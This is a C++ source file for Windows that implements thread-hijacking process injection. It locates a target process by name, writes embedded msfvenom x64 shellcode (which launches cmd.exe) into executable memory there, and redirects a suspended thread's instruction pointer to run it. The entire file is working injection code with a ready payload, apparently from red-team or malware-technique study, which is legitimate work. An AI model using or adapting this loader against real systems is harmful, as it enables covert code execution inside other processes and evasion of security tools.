#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <string>

// msfvenom -p windows/x64/exec CMD=cmd.exe EXITFUNC=thread -f c



// function prototypes
DWORD procfinder(std::string pname);
HANDLE threadFinder(DWORD targetProcess);
void err(const char* estring);

int main(int argc, const char **argv){

	/*
	if (argc < 2) {

		printf("Usage: ThreadHijacking.cpp <tprocessname>");
		return 0;

	}
	*/


	char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
		"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
		"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
		"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
		"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
		"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
		"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
		"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
		"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
		"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
		"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
		"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
		"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
		"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
		"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64"
		"\x2e\x65\x78\x65\x00";

	std::string pname = argv[1];
	DWORD pid = procfinder(pname); // find process by name

	HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
	if (hProcess) {


		LPVOID buf = ::VirtualAllocEx(hProcess, 0, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (buf) {

			if (!::WriteProcessMemory(hProcess, buf, shellcode, sizeof(shellcode), NULL))
				err("Unable to write shellcode to remote process");

			HANDLE hThread = threadFinder(pid);
			if (hThread) {

				::SuspendThread(hThread);

				CONTEXT context;
				context.ContextFlags = CONTEXT_FULL;

				::GetThreadContext(hThread, &context);
				context.Rip = (DWORD_PTR)buf;
				::SetThreadContext(hThread, &context);

				::ResumeThread(hThread);
			}
		}
		else
			err("Unable to allocate memory in remote process");
	} else 
		err("Unable to open a handle to target process");

}


DWORD procfinder(std::string pname) {

	DWORD pid = 0;
	PROCESSENTRY32 entry;

	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (::Process32First(snapshot, &entry) == TRUE) {

		while (::Process32Next(snapshot, &entry) == TRUE) {

			std::wstring ws(pname.begin(), pname.end());

			if (std::wstring(entry.szExeFile) == ws)
				pid = entry.th32ProcessID;

		}


	}


	if (pid == 0)
		err("Unable to resolve process name");

	return pid;

}

HANDLE threadFinder(DWORD targetProcess) {

	HANDLE targetThread;
	THREADENTRY32 tEntry;
	tEntry.dwSize = sizeof(THREADENTRY32);


	HANDLE snapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	::Thread32First(snapshot, &tEntry);

	while (::Thread32Next(snapshot, &tEntry)) {

		if (tEntry.th32OwnerProcessID == targetProcess) {

			targetThread = ::OpenThread(THREAD_ALL_ACCESS, FALSE, tEntry.th32ThreadID);
			return targetThread;

		}

	}
	
	return 0;

}

void err(const char* estring) {

	printf("Error: %s\nErrorCode:%d\n\n", estring, ::GetLastError());
	exit(1);

}